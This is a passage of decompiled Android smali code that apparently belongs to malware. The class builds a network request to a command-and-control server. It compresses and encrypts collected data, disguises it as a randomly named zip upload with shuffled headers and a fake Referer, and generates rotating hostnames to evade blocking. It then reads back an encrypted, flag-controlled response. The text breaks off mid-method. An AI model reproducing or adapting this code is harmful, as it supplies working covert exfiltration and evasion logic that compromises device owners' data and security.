.class public Lcom/android/x5a807058/ax;
.super Ljava/lang/Object;

# interfaces
.implements Lcom/android/zics/ZCtrlRequestInterface;


# instance fields
.field public a:Lcom/android/zics/ZOutputStreamInterface;

.field private b:Lcom/android/zics/ZRuntimeInterface;

.field private c:Ljava/util/Random;

.field private d:Ljava/nio/ByteBuffer;

.field private e:I

.field private f:Lcom/android/zics/ZInputStreamInterface;

.field private g:Lcom/android/zics/ZModuleInterface;


# direct methods
.method public constructor <init>()V
    .locals 0

    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method

.method private a(Ljava/lang/String;)Ljava/lang/String;
    .locals 8

    const/4 v1, 0x0

    iget-object v0, p0, Lcom/android/x5a807058/ax;->c:Ljava/util/Random;

    const/4 v2, 0x5

    invoke-virtual {v0, v2}, Ljava/util/Random;->nextInt(I)I

    move-result v0

    add-int/lit8 v4, v0, 0x3

    new-instance v0, Ljava/lang/String;

    invoke-direct {v0}, Ljava/lang/String;-><init>()V

    const-string v5, ""

    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v2, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    add-int/lit8 v2, v4, 0x61

    int-to-char v2, v2

    invoke-virtual {v0, v2}, Ljava/lang/StringBuilder;->append(C)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    move-object v2, v0

    move v0, v1

    :goto_0
    invoke-virtual {p1}, Ljava/lang/String;->length()I

    move-result v3

    if-ge v0, v3, :cond_2

    new-instance v3, Ljava/lang/StringBuilder;

    invoke-direct {v3}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v3, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {p1, v0}, Ljava/lang/String;->charAt(I)C

    move-result v3

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(C)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    move v3, v1

    :goto_1
    if-ge v3, v4, :cond_1

    iget-object v6, p0, Lcom/android/x5a807058/ax;->c:Ljava/util/Random;

    const/4 v7, 0x2

    invoke-virtual {v6, v7}, Ljava/util/Random;->nextInt(I)I

    move-result v6

    if-eqz v6, :cond_0

    new-instance v6, Ljava/lang/StringBuilder;

    invoke-direct {v6}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v6, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    iget-object v6, p0, Lcom/android/x5a807058/ax;->c:Ljava/util/Random;

    const/16 v7, 0xa

    invoke-virtual {v6, v7}, Ljava/util/Random;->nextInt(I)I

    move-result v6

    add-int/lit8 v6, v6, 0x30

    int-to-char v6, v6

    invoke-virtual {v2, v6}, Ljava/lang/StringBuilder;->append(C)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    :goto_2
    add-int/lit8 v3, v3, 0x1

    goto :goto_1

    :cond_0
    new-instance v6, Ljava/lang/StringBuilder;

    invoke-direct {v6}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v6, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    iget-object v6, p0, Lcom/android/x5a807058/ax;->c:Ljava/util/Random;

    const/16 v7, 0x1a

    invoke-virtual {v6, v7}, Ljava/util/Random;->nextInt(I)I

    move-result v6

    add-int/lit8 v6, v6, 0x61

    int-to-char v6, v6

    invoke-virtual {v2, v6}, Ljava/lang/StringBuilder;->append(C)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    goto :goto_2

    :cond_1
    add-int/lit8 v0, v0, 0x1

    goto :goto_0

    :cond_2
    invoke-direct {p0, v2, v5}, Lcom/android/x5a807058/ax;->a(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    return-object v0
.end method

.method private a(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;
    .locals 4

    invoke-virtual {p1}, Ljava/lang/String;->length()I

    move-result v0

    iget-object v1, p0, Lcom/android/x5a807058/ax;->c:Ljava/util/Random;

    div-int/lit8 v0, v0, 0x2

    invoke-virtual {v1, v0}, Ljava/util/Random;->nextInt(I)I

    move-result v0

    add-int/lit8 v1, v0, 0x2

    iget-object v0, p0, Lcom/android/x5a807058/ax;->c:Ljava/util/Random;

    invoke-virtual {v0, v1}, Ljava/util/Random;->nextInt(I)I

    move-result v0

    if-nez v0, :cond_0

    const/4 v0, 0x1

    :cond_0
    invoke-virtual {p2}, Ljava/lang/String;->length()I

    move-result v2

    if-lez v2, :cond_1

    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v2, p2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    const-string v3, "&"

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p2

    :cond_1
    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v2, p2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    const/4 v3, 0x0

    invoke-virtual {p1, v3, v0}, Ljava/lang/String;->substring(II)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    new-instance v3, Ljava/lang/StringBuilder;

    invoke-direct {v3}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v3, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    const-string v3, "="

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    new-instance v3, Ljava/lang/StringBuilder;

    invoke-direct {v3}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v3, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {p1, v0, v1}, Ljava/lang/String;->substring(II)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v2, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-virtual {p1}, Ljava/lang/String;->length()I

    move-result v2

    invoke-virtual {p1, v1, v2}, Ljava/lang/String;->substring(II)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/String;->length()I

    move-result v2

    const/4 v3, 0x4

    if-ge v2, v3, :cond_2

    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v2, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    :goto_0
    return-object v0

    :cond_2
    invoke-direct {p0, v1, v0}, Lcom/android/x5a807058/ax;->a(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    goto :goto_0
.end method

.method private b(Ljava/lang/String;)Ljava/lang/String;
    .locals 6

    invoke-virtual {p1}, Ljava/lang/String;->length()I

    move-result v2

    const-string v0, ""

    const/16 v1, 0x24

    new-array v3, v1, [C

    fill-array-data v3, :array_0

    const/4 v1, 0x0

    :goto_0
    if-ge v1, v2, :cond_0

    iget-object v4, p0, Lcom/android/x5a807058/ax;->c:Ljava/util/Random;

    const/16 v5, 0x15

    invoke-virtual {v4, v5}, Ljava/util/Random;->nextInt(I)I

    move-result v4

    new-instance v5, Ljava/lang/StringBuilder;

    invoke-direct {v5}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v5, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    add-int/lit8 v5, v4, 0x61

    int-to-char v5, v5

    invoke-virtual {v0, v5}, Ljava/lang/StringBuilder;->append(C)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    new-instance v5, Ljava/lang/StringBuilder;

    invoke-direct {v5}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v5, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {p1, v1}, Ljava/lang/String;->charAt(I)C

    move-result v5

    and-int/lit8 v5, v5, 0xf

    add-int/2addr v5, v4

    aget-char v5, v3, v5

    invoke-virtual {v0, v5}, Ljava/lang/StringBuilder;->append(C)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    new-instance v5, Ljava/lang/StringBuilder;

    invoke-direct {v5}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v5, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {p1, v1}, Ljava/lang/String;->charAt(I)C

    move-result v5

    ushr-int/lit8 v5, v5, 0x4

    and-int/lit8 v5, v5, 0xf

    add-int/2addr v4, v5

    aget-char v4, v3, v4

    invoke-virtual {v0, v4}, Ljava/lang/StringBuilder;->append(C)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    add-int/lit8 v1, v1, 0x1

    goto :goto_0

    :cond_0
    return-object v0

    :array_0
    .array-data 2
        0x30s
        0x31s
        0x32s
        0x33s
        0x34s
        0x61s
        0x62s
        0x63s
        0x64s
        0x65s
        0x66s
        0x67s
        0x68s
        0x69s
        0x6as
        0x6bs
        0x6cs
        0x6ds
        0x6es
        0x6fs
        0x70s
        0x71s
        0x72s
        0x73s
        0x74s
        0x75s
        0x76s
        0x77s
        0x78s
        0x79s
        0x7as
        0x35s
        0x36s
        0x37s
        0x38s
        0x39s
    .end array-data
.end method

.method private c(Ljava/lang/String;)Ljava/lang/String;
    .locals 4

    invoke-direct {p0, p1}, Lcom/android/x5a807058/ax;->b(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/String;->length()I

    move-result v1

    iget-object v2, p0, Lcom/android/x5a807058/ax;->c:Ljava/util/Random;

    ushr-int/lit8 v1, v1, 0x1

    add-int/lit8 v1, v1, -0x2

    invoke-virtual {v2, v1}, Ljava/util/Random;->nextInt(I)I

    move-result v1

    add-int/lit8 v1, v1, 0x3

    const/4 v2, 0x0

    invoke-virtual {v0, v2, v1}, Ljava/lang/String;->substring(II)Ljava/lang/String;

    move-result-object v2

    new-instance v3, Ljava/lang/StringBuilder;

    invoke-direct {v3}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v3, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    const-string v3, "."

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    new-instance v3, Ljava/lang/StringBuilder;

    invoke-direct {v3}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v3, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v0, v1}, Ljava/lang/String;->substring(I)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v2, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    new-instance v1, Ljava/lang/StringBuilder;

    invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v1, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    iget-object v1, p0, Lcom/android/x5a807058/ax;->b:Lcom/android/zics/ZRuntimeInterface;

    iget-object v2, p0, Lcom/android/x5a807058/ax;->c:Ljava/util/Random;

    const/16 v3, 0x9

    invoke-virtual {v2, v3}, Ljava/util/Random;->nextInt(I)I

    move-result v2

    invoke-interface {v1, v2}, Lcom/android/zics/ZRuntimeInterface;->getRootZone(I)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    return-object v0
.end method


# virtual methods
.method public doRequest()Lcom/android/zics/ZInputStreamInterface;
    .locals 13

    const/4 v12, 0x6

    const/4 v8, 0x1

    const/4 v7, 0x0

    new-array v9, v12, [I

    new-instance v10, Ljava/util/HashMap;

    invoke-direct {v10}, Ljava/util/HashMap;-><init>()V

    iget-object v0, p0, Lcom/android/x5a807058/ax;->a:Lcom/android/zics/ZOutputStreamInterface;

    invoke-interface {v0}, Lcom/android/zics/ZOutputStreamInterface;->toByteArray()[B

    move-result-object v0

    invoke-static {v0}, Lcom/android/x5a807058/b;->a([B)J

    move-result-wide v0

    iget-object v2, p0, Lcom/android/x5a807058/ax;->a:Lcom/android/zics/ZOutputStreamInterface;

    invoke-interface {v2, v0, v1}, Lcom/android/zics/ZOutputStreamInterface;->writeLong(J)V

    new-instance v0, Lcom/android/x5a807058/a/b/f;

    invoke-direct {v0}, Lcom/android/x5a807058/a/b/f;-><init>()V

    const/high16 v1, 0x20000

    invoke-virtual {v0, v1}, Lcom/android/x5a807058/a/b/f;->h(I)Z

    iget-object v1, p0, Lcom/android/x5a807058/ax;->a:Lcom/android/zics/ZOutputStreamInterface;

    invoke-interface {v1}, Lcom/android/zics/ZOutputStreamInterface;->toByteArray()[B

    move-result-object v3

    array-length v11, v3

    new-instance v1, Ljava/io/ByteArrayInputStream;

    invoke-direct {v1, v3}, Ljava/io/ByteArrayInputStream;-><init>([B)V

    new-instance v2, Ljava/io/ByteArrayOutputStream;

    invoke-direct {v2, v7}, Ljava/io/ByteArrayOutputStream;-><init>(I)V

    invoke-virtual {v0, v2}, Lcom/android/x5a807058/a/b/f;->b(Ljava/io/OutputStream;)V

    array-length v3, v3

    int-to-long v3, v3

    const-wide/16 v5, -0x1

    invoke-virtual/range {v0 .. v6}, Lcom/android/x5a807058/a/b/f;->b(Ljava/io/InputStream;Ljava/io/OutputStream;JJ)V

    invoke-virtual {v2}, Ljava/io/ByteArrayOutputStream;->toByteArray()[B

    move-result-object v0

    sget-object v1, Lcom/android/x5a807058/bh;->b:[B

    invoke-static {v0, v1}, Lcom/android/x5a807058/a;->a([B[B)[B

    move-result-object v0

    invoke-static {v0}, Ljava/nio/ByteBuffer;->wrap([B)Ljava/nio/ByteBuffer;

    move-result-object v0

    iput-object v0, p0, Lcom/android/x5a807058/ax;->d:Ljava/nio/ByteBuffer;

    sget-object v0, Ljava/util/Locale;->ENGLISH:Ljava/util/Locale;

    const-string v1, "%d"

    new-array v2, v8, [Ljava/lang/Object;

    iget v3, p0, Lcom/android/x5a807058/ax;->e:I

    int-to-long v3, v3

    const-wide v5, 0xffffffffL

    and-long/2addr v3, v5

    invoke-static {v3, v4}, Ljava/lang/Long;->valueOf(J)Ljava/lang/Long;

    move-result-object v3

    aput-object v3, v2, v7

    invoke-static {v0, v1, v2}, Ljava/lang/String;->format(Ljava/util/Locale;Ljava/lang/String;[Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v0

    invoke-direct {p0, v0}, Lcom/android/x5a807058/ax;->c(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v6

    move v0, v7

    :goto_0
    if-ge v0, v12, :cond_0

    aput v0, v9, v0

    add-int/lit8 v0, v0, 0x1

    goto :goto_0

    :cond_0
    move v0, v7

    :goto_1
    const/16 v1, 0xc

    if-ge v0, v1, :cond_2

    :cond_1
    iget-object v1, p0, Lcom/android/x5a807058/ax;->c:Ljava/util/Random;

    invoke-virtual {v1, v12}, Ljava/util/Random;->nextInt(I)I

    move-result v1

    iget-object v2, p0, Lcom/android/x5a807058/ax;->c:Ljava/util/Random;

    invoke-virtual {v2, v12}, Ljava/util/Random;->nextInt(I)I

    move-result v2

    if-eq v1, v2, :cond_1

    aget v3, v9, v1

    aget v4, v9, v2

    aput v4, v9, v1

    aput v3, v9, v2

    add-int/lit8 v0, v0, 0x1

    goto :goto_1

    :cond_2
    new-instance v0, Lcom/android/x5a807058/q;

    invoke-direct {v0}, Lcom/android/x5a807058/q;-><init>()V

    new-instance v3, Ljava/io/ByteArrayInputStream;

    iget-object v1, p0, Lcom/android/x5a807058/ax;->d:Ljava/nio/ByteBuffer;

    invoke-virtual {v1}, Ljava/nio/ByteBuffer;->array()[B

    move-result-object v1

    invoke-direct {v3, v1}, Ljava/io/ByteArrayInputStream;-><init>([B)V

    const-string v1, "%d"

    new-array v2, v8, [Ljava/lang/Object;

    iget-object v4, p0, Lcom/android/x5a807058/ax;->b:Lcom/android/zics/ZRuntimeInterface;

    invoke-interface {v4}, Lcom/android/zics/ZRuntimeInterface;->getBuildId()I

    move-result v4

    invoke-static {v4}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v4

    aput-object v4, v2, v7

    invoke-static {v1, v2}, Ljava/lang/String;->format(Ljava/lang/String;[Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v1

    invoke-direct {p0, v1}, Lcom/android/x5a807058/ax;->b(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    iget-object v4, p0, Lcom/android/x5a807058/ax;->c:Ljava/util/Random;

    const/16 v5, 0xf

    invoke-virtual {v4, v5}, Ljava/util/Random;->nextInt(I)I

    move-result v4

    add-int/lit8 v4, v4, 0x7

    invoke-static {v4}, Lcom/android/x5a807058/s;->a(I)Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v2, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    const-string v4, ".zip"

    invoke-virtual {v2, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    const-string v4, "application/octet-stream"

    move v5, v8

    invoke-virtual/range {v0 .. v5}, Lcom/android/x5a807058/q;->a(Ljava/lang/String;Ljava/lang/String;Ljava/io/InputStream;Ljava/lang/String;Z)V

    move v1, v7

    :goto_2
    if-ge v1, v12, :cond_3

    aget v2, v9, v1

    packed-switch v2, :pswitch_data_0

    :goto_3
    add-int/lit8 v1, v1, 0x1

    goto :goto_2

    :pswitch_0
    sget-object v2, Ljava/util/Locale;->ENGLISH:Ljava/util/Locale;

    const-string v3, "%d"

    new-array v4, v8, [Ljava/lang/Object;

    invoke-static {v11}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v5

    aput-object v5, v4, v7

    invoke-static {v2, v3, v4}, Ljava/lang/String;->format(Ljava/util/Locale;Ljava/lang/String;[Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v2

    invoke-direct {p0, v2}, Lcom/android/x5a807058/ax;->a(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    const-string v3, "Referer"

    new-instance v4, Ljava/lang/StringBuilder;

    invoke-direct {v4}, Ljava/lang/StringBuilder;-><init>()V

    const-string v5, "http://"

    invoke-virtual {v4, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v4

    invoke-virtual {v4, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v4

    const-string v5, "/?"

    invoke-virtual {v4, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v4

    invoke-virtual {v4, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v10, v3, v2}, Ljava/util/HashMap;->put(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;

    goto :goto_3

    :pswitch_1
    const-string v2, "Accept"

    const-string v3, "text/html,application/xhtml+xml,application/xml,*/*"

    invoke-virtual {v10, v2, v3}, Ljava/util/HashMap;->put(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;

    goto :goto_3

    :pswitch_2
    const-string v2, "Host"

    invoke-virtual {v10, v2, v6}, Ljava/util/HashMap;->put(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;

    goto :goto_3

    :pswitch_3
    const-string v2, "User-Agent"

    const-string v3, "http.agent"

    invoke-static {v3}, Ljava/lang/System;->getProperty(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v10, v2, v3}, Ljava/util/HashMap;->put(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;

    goto :goto_3

    :pswitch_4
    const-string v2, "Connection"

    const-string v3, "close"

    invoke-virtual {v10, v2, v3}, Ljava/util/HashMap;->put(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;

    goto :goto_3

    :pswitch_5
    const-string v2, "Content-Type"

    invoke-virtual {v0}, Lcom/android/x5a807058/q;->d()Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v10, v2, v3}, Ljava/util/HashMap;->put(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;

    goto :goto_3

    :cond_3
    iget-object v1, p0, Lcom/android/x5a807058/ax;->b:Lcom/android/zics/ZRuntimeInterface;

    invoke-interface {v1}, Lcom/android/zics/ZRuntimeInterface;->generateNames()V

    move v1, v8

    :goto_4
    if-eqz v1, :cond_c

    :try_start_0
    new-instance v1, Ljava/net/URL;

    iget-object v2, p0, Lcom/android/x5a807058/ax;->b:Lcom/android/zics/ZRuntimeInterface;

    invoke-interface {v2}, Lcom/android/zics/ZRuntimeInterface;->getFullUrl()Ljava/lang/String;

    move-result-object v2

    invoke-direct {v1, v2}, Ljava/net/URL;-><init>(Ljava/lang/String;)V

    invoke-virtual {v1}, Ljava/net/URL;->openConnection()Ljava/net/URLConnection;

    move-result-object v1

    check-cast v1, Ljava/net/HttpURLConnection;

    const v2, 0x84d0

    invoke-virtual {v1, v2}, Ljava/net/HttpURLConnection;->setReadTimeout(I)V

    const v2, 0x84d0

    invoke-virtual {v1, v2}, Ljava/net/HttpURLConnection;->setConnectTimeout(I)V

    const-string v2, "POST"

    invoke-virtual {v1, v2}, Ljava/net/HttpURLConnection;->setRequestMethod(Ljava/lang/String;)V

    invoke-virtual {v10}, Ljava/util/HashMap;->entrySet()Ljava/util/Set;

    move-result-object v2

    invoke-interface {v2}, Ljava/util/Set;->iterator()Ljava/util/Iterator;

    move-result-object v4

    :goto_5
    invoke-interface {v4}, Ljava/util/Iterator;->hasNext()Z

    move-result v2

    if-eqz v2, :cond_4

    invoke-interface {v4}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    move-result-object v2

    check-cast v2, Ljava/util/Map$Entry;

    invoke-interface {v2}, Ljava/util/Map$Entry;->getKey()Ljava/lang/Object;

    move-result-object v3

    check-cast v3, Ljava/lang/String;

    invoke-interface {v2}, Ljava/util/Map$Entry;->getValue()Ljava/lang/Object;

    move-result-object v2

    check-cast v2, Ljava/lang/String;

    invoke-virtual {v1, v3, v2}, Ljava/net/HttpURLConnection;->setRequestProperty(Ljava/lang/String;Ljava/lang/String;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_5

    :catch_0
    move-exception v1

    const-wide/16 v1, 0x12c

    :try_start_1
    invoke-static {v1, v2}, Ljava/lang/Thread;->sleep(J)V
    :try_end_1
    .catch Ljava/lang/InterruptedException; {:try_start_1 .. :try_end_1} :catch_1

    :goto_6
    iget-object v1, p0, Lcom/android/x5a807058/ax;->b:Lcom/android/zics/ZRuntimeInterface;

    invoke-interface {v1}, Lcom/android/zics/ZRuntimeInterface;->iterateDomainIndex()Z

    move-result v1

    goto :goto_4

    :cond_4
    :try_start_2
    invoke-virtual {v0}, Lcom/android/x5a807058/q;->c()J

    move-result-wide v2

    long-to-int v2, v2

    invoke-virtual {v1, v2}, Ljava/net/HttpURLConnection;->setFixedLengthStreamingMode(I)V

    const/4 v2, 0x0

    invoke-virtual {v1, v2}, Ljava/net/HttpURLConnection;->setInstanceFollowRedirects(Z)V

    const/4 v2, 0x0

    invoke-virtual {v1, v2}, Ljava/net/HttpURLConnection;->setUseCaches(Z)V

    const/4 v2, 0x1

    invoke-virtual {v1, v2}, Ljava/net/HttpURLConnection;->setDoInput(Z)V

    const/4 v2, 0x1

    invoke-virtual {v1, v2}, Ljava/net/HttpURLConnection;->setDoOutput(Z)V

    invoke-virtual {v1}, Ljava/net/HttpURLConnection;->getOutputStream()Ljava/io/OutputStream;

    move-result-object v2

    invoke-virtual {v0, v2}, Lcom/android/x5a807058/q;->a(Ljava/io/OutputStream;)V

    invoke-virtual {v1}, Ljava/net/HttpURLConnection;->connect()V

    invoke-virtual {v1}, Ljava/net/HttpURLConnection;->getResponseCode()I

    move-result v2

    const/16 v3, 0xc8

    if-ne v2, v3, :cond_d

    const-string v2, "Content-Type"

    invoke-virtual {v1, v2}, Ljava/net/HttpURLConnection;->getHeaderField(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    const-string v3, "application/octet-stream"

    invoke-virtual {v2, v3}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v2

    if-eqz v2, :cond_d

    new-instance v4, Ljava/io/DataInputStream;

    invoke-virtual {v1}, Ljava/net/HttpURLConnection;->getInputStream()Ljava/io/InputStream;

    move-result-object v1

    invoke-direct {v4, v1}, Ljava/io/DataInputStream;-><init>(Ljava/io/InputStream;)V

    new-instance v5, Ljava/io/ByteArrayOutputStream;

    invoke-direct {v5}, Ljava/io/ByteArrayOutputStream;-><init>()V

    move v2, v7

    move v3, v7

    :goto_7
    const/4 v1, 0x4

    if-ge v3, v1, :cond_6

    invoke-virtual {v4}, Ljava/io/DataInputStream;->read()I

    move-result v1

    if-gez v1, :cond_5

    new-instance v1, Ljava/io/IOException;

    const-string v2, "Can\'t read flags"

    invoke-direct {v1, v2}, Ljava/io/IOException;-><init>(Ljava/lang/String;)V

    throw v1

    :cond_5
    mul-int/lit8 v6, v3, 0x8

    shl-int/2addr v1, v6

    or-int/2addr v1, v2

    add-int/lit8 v2, v3, 0x1

    move v3, v2

    move v2, v1

    goto :goto_7

    :cond_6
    const v1, 0x3fffffff    # 1.9999999f

    and-int v3, v2, v1

    iget-object v1, p0, Lcom/android/x5a807058/ax;->b:Lcom/android/zics/ZRuntimeInterface;

    invoke-interface {v1, v4, v5}, Lcom/android/zics/ZRuntimeInterface;->copyStream(Ljava/io/InputStream;Ljava/io/OutputStream;)V

    invoke-virtual {v5}, Ljava/io/ByteArrayOutputStream;->toByteArray()[B

    move-result-object v1

    const/high16 v4, 0x40000000    # 2.0f

    and-int/2addr v4, v2

    if-eqz v4, :cond_7

    sget-object v4, Lcom/android/x5a807058/bh;->b:[B

    invoke-static {v1, v4}, Lcom/android/x5a807058/a;->a([B[B)[B

    move-result-object v1

    :cond_7
    const/high16 v4, -0x80000000

    and-int/2addr v2, v4

    if-eqz v2, :cond_b

    new-instance v2, Ljava/io/ByteArrayInputStream;

    invoke-direct {v2, v1}, Ljava/io/ByteArrayInputStream;-><init>([B)V

    new-instance v1, Ljava/io/ByteArrayOutputStream;

    const/4 v4, 0x0

    invoke-direct {v1, v4}, Ljava/io/ByteArrayOutputStream;-><init>(I)V

    const/4 v4, 0x5

    new-array v5, v4, [B

    const/4 v6, 0x0

    invoke-virtual {v2, v5, v6, v4}, Ljava/io/ByteArrayInputStream;->read([BII)I

    move-result v6

    if-eq v6, v4, :cond_8

    new-instance v1, Ljava/io/IOException;

